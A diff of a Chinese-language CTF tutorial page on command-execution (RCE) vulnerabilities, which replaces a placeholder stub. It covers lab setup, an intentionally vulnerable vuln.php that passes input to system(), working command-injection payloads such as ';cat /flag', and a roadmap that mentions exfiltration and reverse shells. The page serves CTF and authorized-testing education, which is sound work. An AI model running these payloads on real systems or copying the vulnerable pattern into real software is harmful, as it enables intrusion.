@@ -2487,10 +2487,104 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#quick-start" class="md-nav__link">
+  <a href="#0" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Quick Start
+        0. 一分钟版本
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 先搞清概念：代码执行 ≠ 命令执行
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 前置：够用的 Linux 命令
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 30 分钟上手：先在靶场上犯错
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 30 分钟上手：先在靶场上犯错">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 搭环境（三选一）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-ping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 第一道题：ping 型命令注入（完整走一遍）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-rce-labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.3 RCE-labs 练习顺序（按阶段刷，别按编号硬刷）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 原理：为什么能"越狱"
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 利用路线图
       
     </span>
   </a>
@@ -2584,9 +2678,336 @@
 
 
 <h1 id="_1">命令执行<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
-<h2 id="quick-start">Quick Start<a class="headerlink" href="#quick-start" title="Permanent link">&para;</a></h2>
-<p>施工中，可先看 Reference</p>
-<p>Reference： https://c1oudfl0w0.github.io/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/</p>
+<blockquote>
+<p>一句话：<strong>命令执行漏洞 = 你输入的内容，被当成系统命令的一部分执行了。</strong></p>
+</blockquote>
+<p><code>02-WEB</code> 学习路线里把「命令执行」放在第一位，不是因为它最简单，而是因为它最"值钱"——能拿到服务器的命令执行，基本等于拿下了这台机器。同时它也是你顺带学会 Linux 的最好借口。</p>
+<div class="admonition tip">
+<p class="admonition-title">本文怎么用</p>
+<ul>
+<li>完全零基础：按 <code>1 → 2 → 3 → 4 → 6</code> 顺序读，边读边在靶场上敲，<strong>不要只读不敲</strong>。</li>
+<li>已经做过几道题：直接跳到 <code>8 绕过过滤速查表</code>、<code>10 为什么你的 payload 打不通</code>、<code>11 AI 时代怎么学</code>。</li>
+<li>本文的 payload 与脚本绝大多数已在本地环境实测（PHP 8.4 + RCE-labs 源码复现靶场），少数依赖旧版本 PHP 或特定 shell 的技巧会在原处标注。</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">免责声明</p>
+<p>本文所有内容仅用于 CTF 比赛、自己搭建的靶场、以及获得书面授权的渗透测试。<strong>未授权地对真实系统利用 RCE 是违法行为</strong>，没有"我只是试试"这种说法。</p>
+</div>
+<h2 id="0">0. 一分钟版本<a class="headerlink" href="#0" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>你看到的现象</th>
+<th>关键词</th>
+<th>去哪一节</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>输入点会执行系统命令（<code>ping</code>、<code>system</code>、<code>ls</code>）</td>
+<td>命令注入、分隔符</td>
+<td><a href="#has-echo">6 有回显</a></td>
+</tr>
+<tr>
+<td>命令执行了，但页面什么都不返回</td>
+<td>无回显、盲注、带外、写文件</td>
+<td><a href="#no-echo">7 无回显</a></td>
+</tr>
+<tr>
+<td>提示 <code>WAF!</code> / 关键词被禁 / 空格被禁</td>
+<td>黑名单绕过、通配符、<code>$IFS</code></td>
+<td><a href="#bypass">8 绕过过滤</a></td>
+</tr>
+<tr>
+<td><code>eval</code>、<code>assert</code>、无参套娃</td>
+<td>代码执行、PHP 特性</td>
+<td><a href="#php">9 PHP 专项</a></td>
+</tr>
+<tr>
+<td>抄来的 payload 明明对却打不通</td>
+<td>版本差异、编码层级、shell 差异</td>
+<td><a href="#why-fail">10 为什么打不通</a></td>
+</tr>
+</tbody>
+</table>
+<p>三条利用路线，先判断题型再动手：</p>
+<ol>
+<li><strong>有回显</strong> → 直接拼接命令，读文件走人。</li>
+<li><strong>无回显</strong> → 写文件回读 / 时间盲注 / DNS、HTTP 带外 / 反弹 shell。</li>
+<li><strong>有过滤</strong> → 先判断"过滤了什么"，再查绕过表。</li>
+</ol>
+<h2 id="1">1. 先搞清概念：代码执行 ≠ 命令执行<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
+<p>这一节看着像名词解释，但它决定你之后看 writeup 时能不能对上号。</p>
+<ul>
+<li><strong>任意代码执行（Arbitrary Code Execution, ACE）</strong>：攻击者能让目标运行"攻击者选择的代码"，这里的代码泛指任何程序/脚本/函数调用。</li>
+<li><strong>远程代码执行（Remote Code Execution, RCE）</strong>：通过网络触发的 ACE。<strong>CTF 里说的 RCE 一般就是指这个。</strong></li>
+<li><strong>代码执行（Code Execution）</strong>：在某个语言里，通过函数/方法执行<strong>该语言</strong>的代码。PHP 里的代表是 <code>eval()</code>、<code>assert()</code>（PHP &lt; 8）。</li>
+<li><strong>命令执行（Command Execution）</strong>：在<strong>操作系统层面</strong>执行命令，如 Windows 的 CMD、Linux 的 Shell。PHP 里的代表是 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>代码执行</th>
+<th>命令执行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>执行的是什么</td>
+<td>该语言的代码，如 <code>eval("echo 1;")</code></td>
+<td>系统命令，如 <code>system("id")</code></td>
+</tr>
+<tr>
+<td>典型入口</td>
+<td><code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、回调函数、文件包含</td>
+<td><code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、反引号</td>
+</tr>
+<tr>
+<td>拿 shell 的难度</td>
+<td>有 <code>eval</code> 就等于有代码执行，可以直接调用命令执行函数</td>
+<td>直接就是 shell，但可能被 <code>disable_functions</code> 拦</td>
+</tr>
+<tr>
+<td>谁更危险</td>
+<td>都能致命：<code>eval("system('id');")</code> 一步到位</td>
+<td>同左</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition note">
+<p class="admonition-title">两个概念在实战里经常混着说</p>
+<p>靶场里 Level 0 就是这么设计的：<code>eval</code> 里写 <code>include('flag.php')</code> 是<strong>代码执行</strong>拿 flag，<code>system('cat /flag')</code> 是<strong>命令执行</strong>拿 flag。做题时不必纠结叫法，<strong>纠结的是"我的输入走到了哪一层"</strong>。</p>
+</div>
+<h2 id="2-linux">2. 前置：够用的 Linux 命令<a class="headerlink" href="#2-linux" title="Permanent link">&para;</a></h2>
+<p>不用先系统学 Linux，下面这张表能覆盖 90% 的命令执行题目。<strong>建议对照靶场边用边记</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>命令</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>看当前目录</td>
+<td><code>ls</code>、<code>ls -la</code>、<code>ls /</code></td>
+<td><code>ls -t</code> 按时间排（长度限制题会用到）</td>
+</tr>
+<tr>
+<td>读文件</td>
+<td><code>cat</code>、<code>tac</code>（倒序）、<code>head</code>、<code>tail</code>、<code>nl</code>、<code>sort</code>、<code>uniq</code></td>
+<td><code>?</code> 和 <code>*</code> 通配符可绕文件名过滤</td>
+</tr>
+<tr>
+<td>找文件</td>
+<td><code>find / -name "*flag*" 2&gt;/dev/null</code></td>
+<td>不知道 flag 在哪就用它</td>
+</tr>
+<tr>
+<td>搜内容</td>
+<td><code>grep -r "flag" /var/www 2&gt;/dev/null</code></td>
+<td></td>
+</tr>
+<tr>
+<td>身份/环境</td>
+<td><code>id</code>、<code>whoami</code>、<code>env</code>、<code>pwd</code>、<code>uname -a</code></td>
+<td>判断权限与系统</td>
+</tr>
+<tr>
+<td>编码</td>
+<td><code>base64</code>、<code>xxd -p</code>、<code>od</code>、<code>iconv</code></td>
+<td>带外与绕过滤常用</td>
+</tr>
+<tr>
+<td>写文件</td>
+<td><code>echo x &gt; f</code>、<code>printf</code>、<code>tee</code>、<code>sed</code>、<code>awk</code></td>
+<td><code>&gt;</code> 覆盖，<code>&gt;&gt;</code> 追加</td>
+</tr>
+<tr>
+<td>网络</td>
+<td><code>curl</code>、<code>wget</code>、<code>nc</code>、<code>/dev/tcp</code></td>
+<td>带外、传马、反弹 shell</td>
+</tr>
+<tr>
+<td>提权探测</td>
+<td><code>sudo -l</code>、<code>find / -perm -4000 2&gt;/dev/null</code></td>
+<td>拿到 shell 之后的事</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">顺手把 Shell 元字符记住</p>
+<p><code>;</code> <code>&amp;&amp;</code> <code>||</code> <code>&amp;</code> <code>|</code> <code>`</code> <code>$()</code> <code>&gt;</code> <code>&lt;</code> <code>#</code> —— 这 10 个符号是命令执行的"钥匙"。下一节就会用到。</p>
+</div>
+<h2 id="3-30">3. 30 分钟上手：先在靶场上犯错<a class="headerlink" href="#3-30" title="Permanent link">&para;</a></h2>
+<p><strong>不要先背 payload。</strong> 先搭一个靶场，然后亲手把 <code>id</code> 打出来。</p>
+<h3 id="setup">3.1 搭环境（三选一）<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h3>
+<p><strong>方式 A：RCE-labs（推荐，题目最全）</strong></p>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><a href="#__codelineno-0-1"><span class="linenos" data-linenos=" 1 "></span></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/ProbiusOfficial/RCE-labs.git
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><a href="#__codelineno-0-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="nb">cd</span><span class="w"> </span>RCE-labs
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><a href="#__codelineno-0-3"><span class="linenos" data-linenos=" 3 "></span></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a><a href="#__codelineno-0-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="c1"># 方式 A1：只构建某一关（快）</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><a href="#__codelineno-0-5"><span class="linenos" data-linenos=" 5 "></span></a>docker<span class="w"> </span>build<span class="w"> </span>-f<span class="w"> </span><span class="s2">"Level 4/Dockerfile"</span><span class="w"> </span>-t<span class="w"> </span>rce_labs:v4<span class="w"> </span><span class="s2">"Level 4"</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><a href="#__codelineno-0-6"><span class="linenos" data-linenos=" 6 "></span></a>docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>-p<span class="w"> </span><span class="m">18080</span>:80<span class="w"> </span>--name<span class="w"> </span>rce4<span class="w"> </span>rce_labs:v4
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><a href="#__codelineno-0-7"><span class="linenos" data-linenos=" 7 "></span></a>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a><a href="#__codelineno-0-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="c1"># 方式 A2：构建全部 28 关（慢，会依次构建 rce_labs:v0 ~ v27）</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a><a href="#__codelineno-0-9"><span class="linenos" data-linenos=" 9 "></span></a>bash<span class="w"> </span>build.sh
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a><a href="#__codelineno-0-10"><span class="linenos" data-linenos="10 "></span></a>docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>-p<span class="w"> </span><span class="m">18084</span>:80<span class="w"> </span>--name<span class="w"> </span>rce4b<span class="w"> </span>rce_labs:v4
+</code></pre></div>
+<p>浏览器访问 <code>http://127.0.0.1:18080</code> 即可。关卡源码就在 <code>Level N/index.php</code>，<strong>先看源码注释再打</strong>，这是最高效的学习方式。</p>
+<div class="admonition tip">
+<p class="admonition-title">flag 在哪？</p>
+<p>容器启动时会把 flag 写进 <code>/flag</code>（默认 <code>flag{TEST_Dynamic_FLAG}</code>，也可以用 <code>-e FLAG='flag{test}'</code> 覆盖）。想确认自己的 flag：<code>docker exec -it rce4 cat /flag</code>。每关源码注释里也写明了 flag 路径（例如 Level 4 的 <code>flag is /flag</code>）。</p>
+</div>
+<p><strong>方式 B：零依赖，自己搭一个最小靶场（最推荐新生先做这个）</strong></p>
+<p>只要本机装了 PHP，建一个 <code>vuln.php</code>：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><a href="#__codelineno-1-1"><span class="linenos" data-linenos="1 "></span></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><a href="#__codelineno-1-2"><span class="linenos" data-linenos="2 "></span></a><span class="c1">// vuln.php —— 最小命令注入靶场</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><a href="#__codelineno-1-3"><span class="linenos" data-linenos="3 "></span></a><span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'127.0.0.1'</span><span class="p">;</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a><a href="#__codelineno-1-4"><span class="linenos" data-linenos="4 "></span></a><span class="nb">system</span><span class="p">(</span><span class="s2">"ping -c 1 "</span> <span class="o">.</span> <span class="nv">$ip</span><span class="p">);</span>   <span class="c1">// Windows 下换成 ping -n 1</span>
+</code></pre></div>
+<p>启动并测试：</p>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><a href="#__codelineno-2-1"><span class="linenos" data-linenos="1 "></span></a>php<span class="w"> </span>-S<span class="w"> </span><span class="m">127</span>.0.0.1:8080<span class="w"> </span>-t<span class="w"> </span>.
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a><a href="#__codelineno-2-2"><span class="linenos" data-linenos="2 "></span></a><span class="c1"># 正常请求</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a><a href="#__codelineno-2-3"><span class="linenos" data-linenos="3 "></span></a>curl<span class="w"> </span><span class="s1">'http://127.0.0.1:8080/vuln.php?ip=127.0.0.1'</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a><a href="#__codelineno-2-4"><span class="linenos" data-linenos="4 "></span></a><span class="c1"># 注入请求（注意引号，别让本地 shell 先解析了 ; ）</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a><a href="#__codelineno-2-5"><span class="linenos" data-linenos="5 "></span></a>curl<span class="w"> </span><span class="s1">'http://127.0.0.1:8080/vuln.php?ip=127.0.0.1;id'</span>
+</code></pre></div>
+<p>第二条命令会回显出 <code>uid=...</code>，<strong>这就是命令注入</strong>。在自己机器上先看到这一幕，比看十篇 writeup 都管用。</p>
+<p><strong>方式 C：在线平台</strong>（无需本地环境）</p>
+<ul>
+<li>NSSCTF / 青少年 CTF / CTF+ 上搜索标签 <strong>RCE-labs</strong>（或来源选 HelloCTF）</li>
+<li>CTFShow 的 VIP Web 靶场（付费，但前中期学习路线完整）</li>
+</ul>
+<h3 id="32-ping">3.2 第一道题：ping 型命令注入（完整走一遍）<a class="headerlink" href="#32-ping" title="Permanent link">&para;</a></h3>
+<p>靶场源码（等价于 RCE-labs Level 4）：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><a href="#__codelineno-3-1"><span class="linenos" data-linenos="1 "></span></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><a href="#__codelineno-3-2"><span class="linenos" data-linenos="2 "></span></a><span class="c1">// flag is /flag</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><a href="#__codelineno-3-3"><span class="linenos" data-linenos="3 "></span></a><span class="k">function</span> <span class="nf">hello_server</span><span class="p">(</span><span class="nv">$ip</span><span class="p">){</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a><a href="#__codelineno-3-4"><span class="linenos" data-linenos="4 "></span></a>    <span class="nb">system</span><span class="p">(</span><span class="s2">"ping -c 1 </span><span class="si">$ip</span><span class="s2">"</span><span class="p">);</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a><a href="#__codelineno-3-5"><span class="linenos" data-linenos="5 "></span></a><span class="p">}</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6"></a><a href="#__codelineno-3-6"><span class="linenos" data-linenos="6 "></span></a><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_server</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a><a href="#__codelineno-3-7"><span class="linenos" data-linenos="7 "></span></a>
+<a id="__codelineno-3-8" name="__codelineno-3-8"></a><a href="#__codelineno-3-8"><span class="linenos" data-linenos="8 "></span></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9"></a><a href="#__codelineno-3-9"><span class="linenos" data-linenos="9 "></span></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><code>$ip</code> 完全可控，最终拼成了 <code>ping -c 1 &lt;你的输入&gt;</code> 丢给 shell 执行。于是：</p>
+<table>
+<thead>
+<tr>
+<th>请求</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>?ip=127.0.0.1;cat /flag</code></td>
+<td>✅ 执行</td>
+</tr>
+<tr>
+<td><code>?ip=127.0.0.1&amp;&amp;cat /flag</code></td>
+<td>✅ 执行（前面 ping 成功返回 0）</td>
+</tr>
+<tr>
+<td><code>?ip=127.0.0.1|cat /flag</code></td>
+<td>✅ 执行（管道，输出会作为下一个命令的输入，但 cat 输出仍会回显）</td>
+</tr>
+<tr>
+<td><code>?ip=127.0.0.1%0acat%20/flag</code></td>
+<td>✅ 执行（换行符也是命令分隔符）</td>
+</tr>
+<tr>
+<td><code>?ip=x||cat /flag</code></td>
+<td>⚠️ 只有前面的命令<strong>失败</strong>才执行</td>
+</tr>
+<tr>
+<td><code>?ip=`cat /flag`</code></td>
+<td>✅ 命令替换，flag 会作为 ping 的参数（多半看不到，除非配合 <code>echo</code>）</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title"><code>||</code> 最容易踩的坑</p>
+<p><code>ping -c 1 127.0.0.1 || cat /flag</code> <strong>不会</strong>执行 <code>cat</code>，因为 ping 成功了（返回码 0）。让前半段故意失败（例如 <code>?ip=x||cat /flag</code>），或者干脆用 <code>;</code>。</p>
+</div>
+<h3 id="33-rce-labs">3.3 RCE-labs 练习顺序（按阶段刷，别按编号硬刷）<a class="headerlink" href="#33-rce-labs" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>关卡</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>① 建立概念</td>
+<td>Level 0 ~ 3</td>
+<td>代码执行 vs 命令执行、一句话木马、PHP 代码执行函数、命令执行</td>
+</tr>
+<tr>
+<td>② 命令执行基础</td>
+<td>Level 4 ~ 8</td>
+<td>Shell 运算符、黑名单、通配符、空格过滤、重定向与无回显</td>
+</tr>
+<tr>
+<td>③ Bypass 变形</td>
+<td>Level 9 ~ 18</td>
+<td>无字母命令执行、7/5/4 字符极限长度、环境变量注入</td>
+</tr>
+<tr>
+<td>④ PHP 特性</td>
+<td>Level 22 ~ 26</td>
+<td>动态调用、自增、无参命令执行、取反、无字母数字代码执行</td>
+</tr>
+<tr>
+<td>⑤ RCE 的其它来源</td>
+<td>Level 19 ~ 21、27</td>
+<td>文件写入 / 文件上传 / 文件包含 / 模板注入导致的 RCE</td>
+</tr>
+</tbody>
+</table>
+<h2 id="4">4. 原理：为什么能"越狱"<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
+<p>漏洞的根因只有一句话：<strong>用户输入被当作"命令"的一部分，而不是"数据"。</strong></p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><a href="#__codelineno-4-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">system("ping -c 1 " . $ip);</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a><a href="#__codelineno-4-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">//      └──── 命令 A ────┘</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a><a href="#__codelineno-4-3"><span class="linenos" data-linenos="3 "></span></a><span class="x">// 你输入 127.0.0.1;id 后，shell 看到的是：</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a><a href="#__codelineno-4-4"><span class="linenos" data-linenos="4 "></span></a><span class="x">//      ping -c 1 127.0.0.1;id</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a><a href="#__codelineno-4-5"><span class="linenos" data-linenos="5 "></span></a><span class="x">//                          └─ shell 认为这是另一条命令</span>
+</code></pre></div>
+<p>关键在于 <code>system()</code> 底层是 <code>popen</code> → <code>sh -c "..."</code>，也就是<strong>你的输入会被交给 shell 重新解析一次</strong>。shell 不关心"这是用户数据"，它只认符号。</p>
+<div class="admonition note">
+<p class="admonition-title">心法：弄清你的输入落在哪一层</p>
+<p>一次典型的命令执行链路：</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><a href="#__codelineno-5-1"><span class="linenos" data-linenos="1 "></span></a>HTTP 请求  →  PHP 代码（字符串拼接）  →  sh -c 解析  →  真正的命令
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><a href="#__codelineno-5-2"><span class="linenos" data-linenos="2 "></span></a>   ↑ 编码层        ↑ 语言层                ↑ shell 层
+</code></pre></div>
+<p>以后每遇到一道新题，都问自己三个问题：
+1. 我的输入在<strong>语言层</strong>被怎么处理了（拼接？过滤？转义？）
+2. 到了 <strong>shell 层</strong>还剩什么符号可用（<code>;</code> 还在吗？空格还在吗？）
+3. <strong>编码层</strong>有没有二次解码（<code>%0a</code> 会不会先被 URL 解码成换行）</p>
+<p>90% 的"payload 打不通"，都是这三层里有一层没对上（详见 <a href="#why-fail">第 10 节</a>）。</p>
+</div>
+<h2 id="5">5. 利用路线图<a class="headerlink" href="#5" title="Permanent link">&para;</a></h2>
+<p>拿到题目后按顺序判断，不要一上来就抄 payload：</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><a href="#__codelineno-6-1"><span class="linenos" data-linenos=" 1 "></span></a>题目给你什么？
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a><a href="#__codelineno-6-2"><span class="linenos" data-linenos=" 2 "></span></a>├─ 源码 / 报错信息里有 system、exec、ping、eval 等关键字
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a><a href="#__codelineno-6-3"><span class="linenos" data-linenos=" 3 "></span></a>│   └─ 先本地复现一遍「正常请求」长什么样 → 再插一个 `;id` 试分隔符
+<a id="__codelineno-6-4" name="__codelineno-6-4"></a><a href="#__codelineno-6-4"><span class="linenos" data-linenos=" 4 "></span></a>├─ 命令执行了但没回显
+<a id="__codelineno-6-5" name="__codelineno-6-5"></a><a href="#__codelineno-6-5"><span class="linenos" data-linenos=" 5 "></span></a>│   └─ 试写文件回读 → 时间盲注 → 带外（DNS/HTTP）→ 反弹 shell
+<a id="__codelineno-6-6" name="__codelineno-6-6"></a><a href="#__codelineno-6-6"><span class="linenos" data-linenos=" 6 "></span></a>├─ 有过滤（WAF!/hacker!/die）
+<a id="__codelineno-6-7" name="__codelineno-6-7"></a><a href="#__codelineno-6-7"><span class="linenos" data-linenos=" 7 "></span></a>│   └─ 先确定过滤了什么：把 payload 逐个字符删，看什么时候不报错
+<a id="__codelineno-6-8" name="__codelineno-6-8"></a><a href="#__codelineno-6-8"><span class="linenos" data-linenos=" 8 "></span></a>│       → 空格？关键词？斜杠？字母数字？长度？括号？
+<a id="__codelineno-6-9" name="__codelineno-6-9"></a><a href="#__codelineno-6-9"><span class="linenos" data-linenos=" 9 "></span></a>└─ 有 eval 但没有命令执行函数
+<a id="__codelineno-6-10" name="__codelineno-6-10"></a><a href="#__codelineno-6-10"><span class="linenos" data-linenos="10 "></span></a>    └─ 代码执行路线：直接 eval 代码 / 无参套娃 / 取反 / 无字母数字
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">一个高效的调试习惯</p>
+<p>把过滤规则"测"出来，而不是"猜"出来。例如空格被过滤时，依次发 <code>cat /flag</code>、`cat</p>
+</div>
 
 
 
@@ -2609,7 +3030,7 @@
     <span class="md-icon" title="最后更新">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年7月5日 09:25:38 UTC">2026年7月5日</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年9月10日 15:45:50 UTC">2026年9月10日</span>
   </span>
 
     
